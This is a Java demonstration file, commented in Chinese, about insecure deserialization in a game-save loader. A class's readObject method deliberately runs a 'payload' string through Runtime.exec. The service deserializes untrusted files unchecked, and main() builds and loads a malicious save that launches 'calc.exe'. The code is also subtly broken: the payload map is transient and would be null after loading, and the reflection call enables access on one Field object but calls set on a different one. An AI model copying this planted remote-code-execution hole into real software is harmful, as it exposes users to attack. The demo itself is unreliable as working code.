import java.io.*;
import java.util.HashMap;
import java.util.Map;

// 领域模型：游戏存档
class GameArchive implements Serializable {
    private String playerName;
    private int level;
    private transient Map<String, Object> gameData = new HashMap<>();

    public GameArchive(String playerName, int level) {
        this.playerName = playerName;
        this.level = level;
    }

    // 恶意扩展：通过反序列化触发任意代码执行
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        if (gameData.containsKey("payload")) {
            // 模拟执行恶意代码
            Runtime.getRuntime().exec(gameData.get("payload").toString());
        }
    }
}

// 领域服务：游戏存档管理
class GameArchiveService {
    // 不安全的反序列化操作
    public GameArchive loadArchive(String filePath) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath))) {
            // 脆弱点：直接反序列化不可信数据
            return (GameArchive) ois.readObject();
        }
    }

    public void saveArchive(GameArchive archive, String filePath) throws IOException {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath))) {
            oos.writeObject(archive);
        }
    }
}

// 应用层：游戏客户端
public class GameClient {
    public static void main(String[] args) {
        GameArchiveService service = new GameArchiveService();
        
        // 模拟正常存档创建
        GameArchive normalArchive = new GameArchive("Player1", 5);
        Map<String, Object> safeData = new HashMap<>();
        safeData.put("checkpoint", "forest");
        
        // 恶意存档构造（攻击者视角）
        GameArchive maliciousArchive = new GameArchive("Hacker", 99);
        Map<String, Object> maliciousData = new HashMap<>();
        maliciousData.put("payload", "calc.exe"); // 恶意载荷
        
        try {
            // 保存恶意存档（模拟攻击者制作恶意文件）
            maliciousArchive.getClass().getDeclaredField("gameData").setAccessible(true);
            maliciousArchive.getClass().getDeclaredField("gameData").set(maliciousArchive, maliciousData);
            service.saveArchive(maliciousArchive, "malicious.save");
            
            // 加载恶意存档（触发漏洞）
            System.out.println("[+] 正在加载正常存档...");
            service.loadArchive("malicious.save"); // 漏洞触发点
            
        } catch (Exception e) {
            System.err.println("[!] 漏洞利用失败: " + e.getMessage());
        }
    }
}